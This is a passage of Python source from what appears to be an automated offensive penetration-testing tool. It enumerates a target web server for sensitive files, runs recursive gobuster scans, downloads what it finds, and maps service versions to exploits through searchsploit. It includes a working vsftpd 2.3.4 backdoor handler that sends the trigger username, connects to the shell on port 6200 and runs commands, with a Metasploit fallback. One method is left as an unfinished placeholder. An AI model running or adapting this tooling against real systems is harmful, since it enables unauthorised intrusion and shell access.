                if "enumeration" in scan_results and "web" in scan_results["enumeration"]:
                    web_results = scan_results["enumeration"]["web"]
                    
                    # Look for the matching port and protocol
                    if isinstance(web_results, list):
                        for web_result in web_results:
                            if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                web_files = web_result.get("files", [])
                                web_dirs = web_result.get("directories", [])
                                
                                # Update current results
                                if web_files or web_dirs:
                                    self.console.print(f"[green]Found {len(web_files)} files and {len(web_dirs)} directories in previous scan results![/green]")
                                    
                                    # Update our current results
                                    web_info = {
                                        "port": port_str,
                                        "protocol": protocol,
                                        "directories": web_dirs,
                                        "files": web_files,
                                        "tech": web_result.get("tech", []),
                                        "vhosts": web_result.get("vhosts", []),
                                        "downloaded_files": web_result.get("downloaded_files", [])
                                    }
                                    
                                    # Store in our current results
                                    if not isinstance(self.results["web"], list):
                                        self.results["web"] = []
                                    
                                    found = False
                                    for i, service in enumerate(self.results["web"]):
                                        if str(service.get("port", "")) == port_str and service.get("protocol", "") == protocol:
                                            self.results["web"][i] = web_info
                                            found = True
                                            break
                                    
                                    if not found:
                                        self.results["web"].append(web_info)
                                    break
            except Exception as e:
                self.logger.error(f"Error loading discovered files from scan results: {str(e)}")
        
        # If no files or directories were found, perform a quick enumeration to discover files
        if not web_files and not web_dirs:
            self.console.print("[yellow]No files or directories discovered yet. Performing quick enumeration to find files...[/yellow]")
            
            # Create a web_info dictionary to store results
            web_info = {
                "port": port_str,
                "protocol": protocol,
                "directories": [],
                "files": [],
                "tech": [],
                "vhosts": [],
                "downloaded_files": []
            }
            
            # Create target URL
            target_url = f"{protocol}://{target}:{port_str}/"
            
            # Try to check for common files
            common_files = [
                "robots.txt", "sitemap.xml", ".htaccess", "crossdomain.xml", 
                "index.html", "index.php", "default.aspx", "favicon.ico",
                ".git/HEAD", "README.md", "CHANGELOG.md", "login.php",
                "admin.php", "wp-login.php", "config.php", "phpinfo.php"
            ]
            
            self.console.print(f"[cyan]Checking for common files on {target_url}...[/cyan]")
            
            for file in common_files:
                file_url = f"{target_url}{file}"
                try:
                    import requests
                    from requests.packages.urllib3.exceptions import InsecureRequestWarning
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    
                    resp = requests.get(file_url, verify=False, timeout=5)
                    if resp.status_code == 200:
                        file_path = f"/{file}"
                        if file_path not in web_info["files"]:
                            self.logger.info(f"Found common file: {file_path}")
                            self.console.print(f"[green]Found: {file_path}[/green]")
                            web_info["files"].append(file_path)
                except Exception as e:
                    self.logger.debug(f"Error checking {file_url}: {str(e)}")
            
            # Check for interesting paths in root directory
            interesting_paths = [
                "/backup", "/admin", "/login", "/config", "/dashboard", 
                "/wp-admin", "/wp-login.php", "/wp-config.php", "/config.php",
                "/administrator", "/phpmyadmin", "/secret", "/private", "/uploads",
                "/images", "/img", "/css", "/js", "/scripts", "/assets"
            ]
            
            self.console.print(f"[cyan]Checking for common directories on {target_url}...[/cyan]")
            
            for path in interesting_paths:
                path_url = f"{target_url.rstrip('/')}{path}"
                try:
                    resp = requests.head(path_url, verify=False, timeout=5)
                    if resp.status_code != 404:
                        if path.endswith("/") or "." not in path:
                            if path not in web_info["directories"]:
                                self.logger.info(f"Found interesting directory: {path}")
                                self.console.print(f"[green]Found directory: {path}[/green]")
                                web_info["directories"].append(path)
                        else:
                            if path not in web_info["files"]:
                                self.logger.info(f"Found interesting file: {path}")
                                self.console.print(f"[green]Found file: {path}[/green]")
                                web_info["files"].append(path)
                except Exception as e:
                    self.logger.debug(f"Error checking {path_url}: {str(e)}")
            
            # Update web_files and web_dirs with newly discovered items
            web_files = web_info["files"]
            web_dirs = web_info["directories"]
            
            # Store the results for future use
            # Make sure we have a list structure for web results
            if not isinstance(self.results["web"], list):
                self.results["web"] = []
            
            # Check if we have an entry for this port/protocol
            found = False
            for i, web_service in enumerate(self.results["web"]):
                if str(web_service.get("port", "")) == port_str and web_service.get("protocol", "") == protocol:
                    self.results["web"][i] = web_info
                    found = True
                    break
            
            if not found:
                self.results["web"].append(web_info)
        
        # If we still have no files or directories, inform the user
        if not web_files and not web_dirs:
            self.console.print("[yellow]No files or directories discovered on this port even after enumeration.[/yellow]")
            self.console.print(f"[yellow]You may need to run a full scan first with: python redflow.py --target {target} --mode full[/yellow]")
            return downloaded_files
        
        # Display discovered files and directories for selection
        self.console.print(f"\n[bold cyan]Files discovered on {protocol}://{target}:{port_str}[/bold cyan]")
        
        all_paths = []
        
        if web_files:
            self.console.print(f"\n[bold green]Files ({len(web_files)}):[/bold green]")
            for i, file in enumerate(web_files, 1):
                self.console.print(f"  {i}. {file}")
                all_paths.append({"type": "file", "path": file})
        
        if web_dirs:
            self.console.print(f"\n[bold green]Directories ({len(web_dirs)}):[/bold green]")
            for i, directory in enumerate(web_dirs, len(web_files) + 1):
                self.console.print(f"  {i}. {directory}")
                all_paths.append({"type": "directory", "path": directory})
        
        # Display all paths with indices
        self.console.print("\n[bold green]Available Files and Directories:[/bold green]")
        for i, path in enumerate(all_paths, 1):
            path_type = path["type"]
            path_url = path["path"]
            if path_type == "directory":
                self.console.print(f"[cyan]{i}.[/cyan] [bold blue][DIR][/bold blue] {path_url}")
            else:
                self.console.print(f"[cyan]{i}.[/cyan] [FILE] {path_url}")
        
        self.console.print("\n[bold]Enter numbers separated by commas, 'all' for all files, 'none' to skip, or 'scan X' to deep scan directory number X[/bold]")
        
        # Interactive mode requires input from user
        try:
            selection = input("> ").strip().lower()
            
            if selection == "all":
                indices = list(range(1, len(all_paths) + 1))
            elif selection == "none" or not selection:
                self.console.print("[yellow]No files selected for download[/yellow]")
                return downloaded_files
            elif selection.startswith("scan "):
                # Parse directory to scan
                try:
                    dir_idx = int(selection.split("scan ")[1].strip())
                    if 1 <= dir_idx <= len(all_paths) and all_paths[dir_idx-1]["type"] == "directory":
                        dir_path = all_paths[dir_idx-1]["path"]
                        
                        # Perform recursive scan on this directory
                        self.console.print(f"[bold cyan]Performing deep scan of directory: {dir_path}[/bold cyan]")
                        scan_results = self.scan_directory_recursively(target, port_str, protocol, dir_path)
                        
                        # Display results and update our data
                        new_files = [f for f in scan_results["files"] if f not in web_files]
                        new_dirs = [d for d in scan_results["directories"] if d not in web_dirs]
                        
                        if new_files or new_dirs:
                            # Update the web_info and results
                            web_files.extend(new_files)
                            web_dirs.extend(new_dirs)
                            
                            # Update in our results structure
                            for web_result in self.results["web"]:
                                if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                    web_result["files"].extend(new_files)
                                    web_result["directories"].extend(new_dirs)
                                    break
                            
                            # Call this function again to display the updated list
                            self.console.print(f"[green]Found {len(new_files)} new files and {len(new_dirs)} new directories![/green]")
                            self.console.print("[yellow]Displaying updated list of files and directories...[/yellow]")
                            return self.interactive_download_files(target, port_str, protocol)
                        else:
                            self.console.print("[yellow]No additional files or directories found[/yellow]")
                            # Continue with the current list
                            return self.interactive_download_files(target, port_str, protocol)
                    else:
                        self.console.print("[red]Invalid directory number. Please choose a directory from the list.[/red]")
                        return self.interactive_download_files(target, port_str, protocol)
                except ValueError:
                    self.console.print("[red]Invalid format. Use 'scan X' where X is the directory number.[/red]")
                    return self.interactive_download_files(target, port_str, protocol)
            else:
                # Parse user selection
                try:
                    indices = [int(idx.strip()) for idx in selection.split(",") if idx.strip()]
                except ValueError:
                    self.console.print("[red]Invalid input. Please enter numbers separated by commas.[/red]")
                    return downloaded_files
            
            # Download selected files
            base_url = f"{protocol}://{target}:{port_str}"
            target_dir = os.path.join(self.config.output_dir, "downloads", f"{protocol}_{port_str}")
            os.makedirs(target_dir, exist_ok=True)
            
            self.console.print(f"[cyan]Files will be downloaded to: {target_dir}[/cyan]")
            
            total_success = 0
            total_failed = 0
            max_retry_count = 2  # Maximum number of retries for failures
            
            for idx in indices:
                if 1 <= idx <= len(all_paths):
                    item = all_paths[idx - 1]
                    path = item["path"]
                    item_type = item["type"]
                    
                    # Create the full URL
                    url = f"{base_url}{path}"
                    
                    # For retrying with modified parameters
                    retry_count = 0
                    
                    while retry_count <= max_retry_count:
                        if item_type == "file":
                            self.console.print(f"[bold]Downloading file: [blue]{path}[/blue]...[/bold]")
                            
                            try:
                                # Directly use requests for download to handle dependency issues
                                local_filename = os.path.join(target_dir, os.path.basename(path))
                                
                                # Ensure we have a filename
                                if not os.path.basename(path):
                                    local_filename = os.path.join(target_dir, "index.html")
                                
                                # Download the file with timeout
                                import requests
                                response = requests.get(url, verify=False, timeout=10, allow_redirects=True)
                                
                                if response.status_code == 200:
                                    with open(local_filename, 'wb') as f:
                                        f.write(response.content)
                                    
                                    downloaded_files.append(local_filename)
                                    self.console.print(f"[green]Downloaded to:[/green] {local_filename}")
                                    total_success += 1
                                    
                                    # Store in results
                                    for web_result in self.results["web"]:
                                        if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                            if "downloaded_files" not in web_result:
                                                web_result["downloaded_files"] = []
                                            
                                            web_result["downloaded_files"].append({
                                                "url": url,
                                                "local_path": local_filename
                                            })
                                            break
                                    
                                    # Success, break retry loop
                                    break
                                else:
                                    self.console.print(f"[yellow]Server returned status code {response.status_code} for {path}[/yellow]")
                                    retry_count += 1
                                    
                                    if retry_count <= max_retry_count:
                                        self.console.print(f"[yellow]Retrying... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                    else:
                                        self.console.print(f"[red]Failed to download {path} after {max_retry_count} attempts[/red]")
                                        total_failed += 1
                            except Exception as e:
                                self.console.print(f"[red]Failed to download {path}: {str(e)}[/red]")
                                retry_count += 1
                                
                                if retry_count <= max_retry_count:
                                    self.console.print(f"[yellow]Retrying... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                else:
                                    total_failed += 1
                        else:  # directory
                            self.console.print(f"[bold]Checking directory: [blue]{path}[/blue]...[/bold]")
                            
                            try:
                                # Try to download index files from directory
                                index_files = ["index.html", "index.php", "default.asp", "index.jsp", "default.html"]
                                dir_success = False
                                
                                for index in index_files:
                                    index_url = f"{base_url}{path}/{index}"
                                    self.console.print(f"[cyan]Trying: {index_url}[/cyan]")
                                    
                                    # Check if file exists with longer timeout
                                    response = requests.head(index_url, verify=False, timeout=10)
                                    if response.status_code == 200:
                                        # Download the file
                                        dir_path = os.path.join(target_dir, os.path.basename(path.rstrip('/')))
                                        os.makedirs(dir_path, exist_ok=True)
                                        
                                        local_filename = os.path.join(dir_path, index)
                                        response = requests.get(index_url, verify=False, timeout=10)
                                        
                                        with open(local_filename, 'wb') as f:
                                            f.write(response.content)
                                        
                                        downloaded_files.append(local_filename)
                                        self.console.print(f"[green]Downloaded directory index to:[/green] {local_filename}")
                                        dir_success = True
                                        total_success += 1
                                        
                                        # Store in results
                                        for web_result in self.results["web"]:
                                            if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                                if "downloaded_files" not in web_result:
                                                    web_result["downloaded_files"] = []
                                                
                                                web_result["downloaded_files"].append({
                                                    "url": index_url,
                                                    "local_path": local_filename
                                                })
                                                break
                                        
                                        # Found and downloaded one index, break loop
                                        break
                                
                                if dir_success:
                                    # Successfully downloaded directory index, break retry loop
                                    break
                                else:
                                    self.console.print("[yellow]No index files found in directory. Try manually browsing to the directory.[/yellow]")
                                    retry_count += 1
                                    
                                    if retry_count <= max_retry_count:
                                        self.console.print(f"[yellow]Retrying with different approach... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                        # On retry, try to download directory listing directly
                                        if retry_count == max_retry_count:
                                            dir_url = f"{base_url}{path}"
                                            try:
                                                dir_path = os.path.join(target_dir, os.path.basename(path.rstrip('/')))
                                                os.makedirs(dir_path, exist_ok=True)
                                                
                                                local_filename = os.path.join(dir_path, "directory.html")
                                                response = requests.get(dir_url, verify=False, timeout=10)
                                                
                                                if response.status_code == 200:
                                                    with open(local_filename, 'wb') as f:
                                                        f.write(response.content)
                                                    
                                                    downloaded_files.append(local_filename)
                                                    self.console.print(f"[green]Downloaded directory listing to:[/green] {local_filename}")
                                                    dir_success = True
                                                    total_success += 1
                                            except Exception as e:
                                                self.console.print(f"[red]Failed to download directory listing: {str(e)}[/red]")
                                    else:
                                        total_failed += 1
                            except Exception as e:
                                self.console.print(f"[red]Failed to check directory {path}: {str(e)}[/red]")
                                retry_count += 1
                                
                                if retry_count <= max_retry_count:
                                    self.console.print(f"[yellow]Retrying... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                else:
                                    total_failed += 1
                else:
                    self.console.print(f"[red]Invalid selection: {idx}[/red]")
            
            # Save results
            try:
                results_file = os.path.join(self.config.output_dir, "results.json")
                if os.path.exists(results_file):
                    with open(results_file, 'r') as f:
                        all_results = json.load(f)
                    
                    # Update the web results
                    if "enumeration" in all_results:
                        all_results["enumeration"]["web"] = self.results["web"]
                    
                    with open(results_file, 'w') as f:
                        json.dump(all_results, f, indent=4)
            except Exception as e:
                self.logger.error(f"Error saving download results: {str(e)}")
            
            # Display summary
            if downloaded_files:
                self.console.print(f"\n[green]Successfully downloaded {total_success} files[/green]")
                self.console.print(f"[cyan]Files saved in: {target_dir}[/cyan]")
                
                # Show command to view files
                self.console.print("\n[yellow]To view or manage downloaded files:[/yellow]")
                self.console.print(f"[cyan]cd {target_dir}[/cyan]")
                self.console.print("[cyan]ls -la[/cyan]")
            else:
                self.console.print("[yellow]No files were successfully downloaded[/yellow]")
            
            if total_failed > 0:
                self.console.print(f"[yellow]Failed to download {total_failed} item(s)[/yellow]")
                
                # Suggest alternatives
                self.console.print("\n[bold cyan]Troubleshooting:[/bold cyan]")
                self.console.print("1. Check if the target is accessible and the service is running")
                self.console.print("2. Try accessing the files directly in a browser")
                self.console.print("3. Verify you have the correct IP address and port")
                self.console.print("4. If you're targeting localhost, make sure the web server is running")
                self.console.print(f"5. Try running: curl -v {protocol}://{target}:{port_str} to test connectivity")
            
            return downloaded_files
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Download operation cancelled by user[/yellow]")
            return downloaded_files

    def scan_directory_recursively(self, target, port, protocol, directory_path):
        """
        Perform recursive directory scan on a web server
        // ביצוע סריקת תיקיות רקורסיבית בשרת web
        
        Args:
            target (str): Target host
            port (int or str): Web service port
            protocol (str): Protocol (http or https)
            directory_path (str): Directory path to scan
            
        Returns:
            dict: Dictionary with discovered files and directories
        """
        result = {
            "directories": [],
            "files": []
        }
        
        # Keep track of directories already scanned to avoid infinite loops
        scanned_dirs = set()
        
        # Maximum recursion depth
        max_depth = 5
        
        def scan_dir(current_dir, depth=0):
            """Inner function to scan directories recursively"""
            nonlocal result, scanned_dirs
            
            if current_dir in scanned_dirs:
                self.logger.info(f"Directory {current_dir} already scanned, skipping")
                return
            
            # Add to scanned set
            scanned_dirs.add(current_dir)
            
            # Check recursion depth
            if depth >= max_depth:
                self.logger.info(f"Maximum recursion depth reached for {current_dir}")
                return
            
            self.console.print(f"[bold cyan]Scanning directory: {current_dir} (Depth: {depth+1}/{max_depth})[/bold cyan]")
            
            # Create target URL
            base_url = f"{protocol}://{target}:{port}"
            target_url = f"{base_url}{current_dir}"
            if not target_url.endswith('/'):
                target_url += '/'
            
            # Try to run a quick gobuster scan on the directory
            try:
                # Choose wordlist
                wordlists = {
                    "common": "/usr/share/wordlists/dirb/common.txt",
                    "small": "/usr/share/wordlists/dirb/small.txt",
                    "medium": "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"
                }
                
                # Use smaller wordlists for deeper directories to improve performance
                if depth == 0:
                    wordlist = wordlists.get("medium", "/usr/share/wordlists/dirb/common.txt")
                    wordlist_name = "medium"
                elif depth == 1:
                    wordlist = wordlists.get("common", "/usr/share/wordlists/dirb/common.txt")
                    wordlist_name = "common"
                else:
                    wordlist = wordlists.get("small", "/usr/share/wordlists/dirb/small.txt")
                    wordlist_name = "small"
                
                # Allow custom wordlist path input if selected wordlist doesn't exist
                if not os.path.exists(wordlist):
                    if depth == 0:  # Only ask once on the initial scan
                        self.console.print("\n[bold cyan]Available wordlists for scanning:[/bold cyan]")
                        for i, (name, path) in enumerate(wordlists.items(), 1):
                            # Check if wordlist exists
                            if os.path.exists(path):
                                self.console.print(f"[green]{i}.[/green] {name} - {path}")
                            else:
                                self.console.print(f"[red]{i}.[/red] {name} - {path} [red](not found)[/red]")
                        
                        self.console.print(f"[cyan]Select a wordlist (1-{len(wordlists)}) or press Enter for default:[/cyan]")
                        choice = input("> ").strip()
                        
                        # Default to common wordlist
                        if not choice or not choice.isdigit() or int(choice) < 1 or int(choice) > len(wordlists):
                            wordlist = "/usr/share/wordlists/dirb/common.txt"
                            wordlist_name = "common"
                        else:
                            wordlist = list(wordlists.values())[int(choice) - 1]
                            wordlist_name = list(wordlists.keys())[int(choice) - 1]
                        
                        # Allow custom wordlist path input if selected wordlist doesn't exist
                        if not os.path.exists(wordlist):
                            self.console.print("[yellow]Selected wordlist not found. Enter a custom wordlist path:[/yellow]")
                            custom_path = input("> ").strip()
                            if custom_path and os.path.exists(custom_path):
                                wordlist = custom_path
                                wordlist_name = os.path.basename(custom_path)
                    else:
                        # In recursive scans, just default to common wordlist
                        wordlist = "/usr/share/wordlists/dirb/common.txt"
                        wordlist_name = "common"
                
                # Ask for extensions to scan (only once on first scan)
                extensions = "php,html,txt,asp,aspx,jsp,cgi"
                if depth == 0:
                    self.console.print(f"[cyan]Using default extensions to look for: {extensions}[/cyan]")
                    self.console.print("[cyan]Enter different file extensions or press Enter to keep default:[/cyan]")
                    user_extensions = input("> ").strip()
                    if user_extensions:
                        extensions = user_extensions
                
                # Create temporary output file
                sanitized_dir = current_dir.replace('/', '_').replace('\\', '_')
                output_file = os.path.join(self.config.output_dir, f"gobuster_recursive_{port}_{sanitized_dir}_{depth}.txt")
                
                # Build gobuster command
                cmd = [
                    "gobuster", "dir",
                    "-u", target_url,
                    "-w", wordlist,
                    "-o", output_file,
                    "-t", "50"  # Increased threads for faster scanning
                ]
                
                # Add extensions if specified
                if extensions:
                    cmd.extend(["-x", extensions])
                
                # Add HTTPS parameter if needed
                if protocol == "https":
                    cmd.extend(["-k"])
                
                # Run gobuster
                self.logger.info(f"Running gobuster with command: {' '.join(cmd)}")
                self.console.print(f"[cyan]Scanning {target_url} with wordlist {os.path.basename(wordlist)}...[/cyan]")
                
                import subprocess
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                # Set a timeout scaling with depth (longer for first level, shorter for deeper levels)
                timeout = 300 if depth == 0 else (180 if depth == 1 else 120)
                stdout, stderr = process.communicate(timeout=timeout)
                
                # Parse results
                found_dirs = []
                if os.path.exists(output_file):
                    with open(output_file, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                        
                        for line in lines:
                            if line.startswith("/") or "(Status:" in line:
                                parts = line.split("(Status:")
                                if len(parts) > 1:
                                    path = parts[0].strip()
                                    status = parts[1].split(")")[0].strip()
                                    
                                    # Add only items with status codes 2xx or 3xx
                                    if status.startswith("2") or status.startswith("3"):
                                        full_path = current_dir
                                        if not full_path.endswith('/'):
                                            full_path += '/'
                                        if path.startswith('/'):
                                            path = path[1:]
                                        full_path += path
                                        
                                        if path.endswith("/"):
                                            result["directories"].append(full_path)
                                            found_dirs.append(full_path)
                                        else:
                                            result["files"].append(full_path)
                    
                    self.console.print(f"[green]Found {len(found_dirs)} directories and {len(result['files']) - len(result.get('files', []))} files in {current_dir}[/green]")
                    
                    # Recursively scan discovered directories
                    for dir_path in found_dirs:
                        scan_dir(dir_path, depth + 1)
                    
            except subprocess.TimeoutExpired:
                self.console.print(f"[yellow]Scan of {current_dir} timed out, continuing with partial results[/yellow]")
            except Exception as e:
                self.console.print(f"[red]Error scanning directory {current_dir}: {str(e)}[/red]")
        
        # Start recursive scan from the initial directory
        scan_dir(directory_path)
        
        self.console.print(f"[bold green]Completed recursive scan. Found {len(result['directories'])} directories and {len(result['files'])} files in total[/bold green]")
        return result

    def find_vulnerabilities_with_searchsploit(self, service_name, version=None):
        """
        Search for vulnerabilities using searchsploit
        
        Args:
            service_name: Service name to search for
            version: Optional version number
            
        Returns:
            List of vulnerabilities found
        """
        self.logger.info(f"Searching for vulnerabilities for {service_name} {version if version else ''}")
        
        # Special case for vsftpd 2.3.4 which has a known backdoor
        if service_name.lower() == "vsftpd" and version == "2.3.4":
            self.logger.info("Known backdoor detected in vsftpd 2.3.4!")
            return [{
                "title": "vsftpd 2.3.4 - Backdoor Command Execution",
                "path": "unix/remote/49757.py",
                "type": "remote",
                "platform": "unix",
                "metasploit_module": "exploit/unix/ftp/vsftpd_234_backdoor"
            }]
        
        # Handle common known vulnerabilities with direct mappings
        known_vulnerabilities = {
            "apache": {
                "2.2.8": [{
                    "title": "Apache 2.2.8 - WebDAV / PHP Remote Code Execution",
                    "path": "unix/remote/18721.py",
                    "type": "remote",
                    "platform": "unix"
                }]
            },
            "distccd": {
                "v1": [{
                    "title": "DistCC Daemon - Command Execution",
                    "path": "unix/remote/9915.rb",
                    "type": "remote",
                    "platform": "unix",
                    "metasploit_module": "exploit/unix/misc/distcc_exec" 
                }]
            },
            "samba": {
                "3.0.20": [{
                    "title": "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution",
                    "path": "unix/remote/16320.rb",
                    "type": "remote",
                    "platform": "unix",
                    "metasploit_module": "exploit/multi/samba/usermap_script"
                }]
            }
        }
        
        # Check if we have hardcoded exploit for this service/version
        if service_name.lower() in known_vulnerabilities and version:
            for known_version, exploits in known_vulnerabilities[service_name.lower()].items():
                if version.startswith(known_version):
                    self.logger.info(f"Found known vulnerability for {service_name} {version}")
                    return exploits
        
        # Construct search query
        search_query = service_name
        if version:
            search_query = f"{service_name} {version}"
        
        # List of search queries to try in order if first one fails
        search_variations = [
            search_query,
            service_name.lower(),  # Try lowercase service name
            re.sub(r'[^a-zA-Z0-9]', '', service_name)  # Try without special chars
        ]
        
        # If we have a version, add variations with just the major.minor parts
        if version and '.' in version:
            version_parts = version.split('.')
            if len(version_parts) >= 2:
                major_minor = '.'.join(version_parts[:2])
                search_variations.append(f"{service_name} {major_minor}")
        
        # Try each search variation
        vulnerabilities = []
        tried_queries = set()
        
        for query in search_variations:
            if query in tried_queries:
                continue
                
            tried_queries.add(query)
            self.logger.info(f"Trying searchsploit query: {query}")
            
            # Run searchsploit
            try:
                cmd = ["searchsploit", "--json", query]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode != 0:
                    self.logger.warning(f"Searchsploit returned non-zero exit code: {result.returncode}")
                    self.logger.warning(f"Error output: {result.stderr}")
                    continue
                
                output = result.stdout
                
                # Try to parse JSON output
                try:
                    search_results = json.loads(output)
                    if "RESULTS_EXPLOIT" in search_results:
                        exploits = search_results["RESULTS_EXPLOIT"]
                        for exploit in exploits:
                            vulnerabilities.append({
                                "title": exploit.get("Title", "Unknown"),
                                "path": exploit.get("Path", "Unknown"),
                                "type": "remote" if "remote" in exploit.get("Path", "").lower() else "local",
                                "platform": exploit.get("Platform", "unknown")
                            })
                except json.JSONDecodeError:
                    self.logger.warning("Failed to parse JSON output from searchsploit")
                    # Fall back to text parsing
                    lines = output.split('\n')
                    for line in lines:
                        if line and not line.startswith('Exploits:') and not line.startswith('Shellcodes:') and not line.startswith('Papers:'):
                            # Extract exploit details
                            parts = line.strip().split('  ')
                            parts = [p for p in parts if p.strip()]
                            
                            if len(parts) >= 2:
                                title = parts[0].strip()
                                path = parts[-1].strip()
                                
                                if title and path:
                                    vulnerabilities.append({
                                        "title": title,
                                        "path": path,
                                        "type": "remote" if "remote" in path.lower() else "local",
                                        "platform": "unknown"
                                    })
                
                # If we found vulnerabilities, no need to try other variations
                if vulnerabilities:
                    break
            
            except subprocess.CalledProcessError as e:
                self.logger.error(f"Error running searchsploit: {str(e)}")
                continue
            except Exception as e:
                self.logger.error(f"Unexpected error in vulnerability search: {str(e)}")
                continue
        
        # If no results found from searchsploit, try to guess based on service
        if not vulnerabilities:
            self.logger.warning(f"No vulnerabilities found via searchsploit for {service_name} {version if version else ''}")
            
            # Add some common/generic exploits for well-known services
            if service_name.lower() == "ftp":
                vulnerabilities.append({
                    "title": "Generic FTP Bruteforce",
                    "path": "generic/bruteforce/ftp_login",
                    "type": "remote",
                    "platform": "multiple",
                    "metasploit_module": "auxiliary/scanner/ftp/ftp_login"
                })
            
            elif service_name.lower() in ["http", "www", "httpd"]:
                vulnerabilities.append({
                    "title": "Generic HTTP Directory Scanner",
                    "path": "generic/scanner/http_dir",
                    "type": "remote",
                    "platform": "multiple",
                    "metasploit_module": "auxiliary/scanner/http/dir_scanner"
                })
            
            elif service_name.lower() == "ssh":
                vulnerabilities.append({
                    "title": "Generic SSH Bruteforce",
                    "path": "generic/bruteforce/ssh_login", 
                    "type": "remote",
                    "platform": "multiple",
                    "metasploit_module": "auxiliary/scanner/ssh/ssh_login"
                })
        
        return vulnerabilities

    def prepare_exploit(self, exploit_path, target):
        """
        Prepare and run an exploit against the target
        
        Args:
            exploit_path: Path to the exploit
            target: Target IP or domain
            
        Returns:
            Boolean: Whether the exploit was successful
        """
        self.logger.info(f"Preparing to run exploit: {exploit_path} against {target}")
        
        # Special case for vsftpd 2.3.4 backdoor
        if "vsftpd" in exploit_path.lower() and "2.3.4" in exploit_path:
            self.logger.info("Detected vsftpd 2.3.4 exploit, using special handler")
            return self._handle_vsftpd_exploit(target)
        
        # Check if the exploit file exists
        if not os.path.exists(exploit_path):
            # It might be a module path rather than a file path
            if exploit_path.startswith('/usr/share/metasploit-framework/'):
                return self._handle_metasploit_exploit(exploit_path, target)
                
            # Check if it's a searchsploit path format (platform/type/id.ext)
            elif '/' in exploit_path and not exploit_path.startswith('/'):
                # Try to find the exploit in the standard searchsploit location
                full_path = f"/usr/share/exploitdb/exploits/{exploit_path}"
                
                if os.path.exists(full_path):
                    self.logger.info(f"Found exploit at: {full_path}")
                    self.console.print(f"[green]Found exploit at: {full_path}[/green]")
                    exploit_path = full_path
                else:
                    self.logger.error(f"Exploit file does not exist: {exploit_path}")
                    self.console.print(f"[bold red]Error:[/bold red] Exploit file does not exist: {exploit_path}")
                    return False
            else:
                self.logger.error(f"Exploit file does not exist: {exploit_path}")
                self.console.print(f"[bold red]Error:[/bold red] Exploit file does not exist: {exploit_path}")
                return False
        
        # ... rest of the method remains the same ...

    def _handle_vsftpd_exploit(self, target):
        """
        Handle the special case of vsftpd 2.3.4 backdoor exploit
        
        Args:
            target: Target IP address
            
        Returns:
            bool: Whether exploitation was successful
        """
        self.logger.info(f"Running special handler for vsftpd 2.3.4 backdoor against {target}")
        self.console.print("\n[bold blue]Using custom handler for vsftpd 2.3.4 backdoor[/bold blue]")
        
        # Try direct Python exploitation instead of using the exploit file
        import socket
        import telnetlib
        import time
        
        # First attempt
        self.console.print("[cyan]First attempt: Trying to trigger vsftpd 2.3.4 backdoor...[/cyan]")
        
        try:
            # Connect to FTP port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, 21))
            
            # Receive banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            self.console.print(f"[green]Connected to FTP server: {banner.strip()}[/green]")
            
            # Send malicious payload - username with trigger characters
            malicious_user = "USER backdoored:)\r\n"
            self.console.print(f"[cyan]Sending malicious payload: {malicious_user.strip()}[/cyan]")
            sock.send(malicious_user.encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            self.console.print(f"[green]Response: {response.strip()}[/green]")
            
            # Send any password
            sock.send(b"PASS random\r\n")
            
            # Close socket - the exploit should have triggered a backdoor on port 6200
            sock.close()
            
            # Wait for backdoor to open - slightly longer wait
            self.console.print("[cyan]Waiting for backdoor to open on port 6200...[/cyan]")
            time.sleep(5)  # Increased wait time
            
            # Try to connect to the backdoor shell
            try:
                self.console.print("[cyan]Attempting to connect to backdoor shell...[/cyan]")
                
                # Try to establish connection to check if port is open
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_sock.settimeout(10)
                
                if test_sock.connect_ex((target, 6200)) == 0:
                    test_sock.close()
                    self.console.print("[green]Port 6200 is open! Connecting to backdoor...[/green]")
                    
                    # Use telnet to connect to backdoor
                    tn = telnetlib.Telnet(target, 6200, timeout=10)
                    self.console.print("[bold green]Successfully connected to backdoor shell![/bold green]")
                    
                    # Send a test command
                    tn.write(b"id\n")
                    output = tn.read_until(b"$", timeout=5).decode('utf-8', errors='ignore')
                    self.console.print(f"[green]Command output: {output}[/green]")
                    
                    # Provide instructions for manual connection
                    self.console.print(f"[bold green]Backdoor shell is now accessible at {target}:6200[/bold green]")
                    self.console.print("[yellow]Connect manually with:[/yellow]")
                    self.console.print(f"[white]telnet {target} 6200[/white]")
                    self.console.print(f"[white]nc {target} 6200[/white]")
                    
                    return True
                else:
                    self.console.print("[yellow]Port 6200 is not open. First attempt failed.[/yellow]")
            except Exception as e:
                self.logger.warning(f"First attempt failed to connect to backdoor: {e}")
                self.console.print(f"[yellow]First attempt failed to connect to backdoor: {e}[/yellow]")
        
        except Exception as e:
            self.logger.warning(f"Error triggering vsftpd backdoor (first attempt): {e}")
            self.console.print(f"[yellow]Error triggering vsftpd backdoor (first attempt): {e}[/yellow]")
        
        # Second attempt with different approach - using metasploit directly
        self.console.print("\n[yellow]First attempt failed. Trying second approach with Metasploit...[/yellow]")
        
        try:
            import subprocess
            import os
            import tempfile
            
            # Create a temporary resource script for metasploit
            fd, resource_path = tempfile.mkstemp(suffix='.rc', prefix='vsftpd_')
            os.close(fd)
            
            with open(resource_path, 'w') as f:
                f.write(f"""use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set RPORT 21
exploit -z
""")
            
            self.console.print("[cyan]Running Metasploit with vsftpd_234_backdoor module...[/cyan]")
